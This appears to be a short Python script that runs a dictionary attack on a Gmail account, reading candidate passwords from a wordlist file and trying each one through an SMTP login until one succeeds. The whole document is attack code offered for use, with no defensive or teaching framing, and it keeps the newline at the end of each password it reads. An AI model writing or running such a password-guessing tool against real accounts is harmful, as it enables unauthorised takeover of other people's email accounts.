import smtplib

# gmail server configuration
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = "example@gmail.com"
with open('words.txt', 'r') as f:
	passwords = f.readlines()

for password in passwords:
	try:
		smtpserver.login(user, password)
		print("[+] Password Found: %s" % password)
		break

	except smtplib.SMTPAuthenticationError:
		print("[!] Password incorrect: %s" % password)
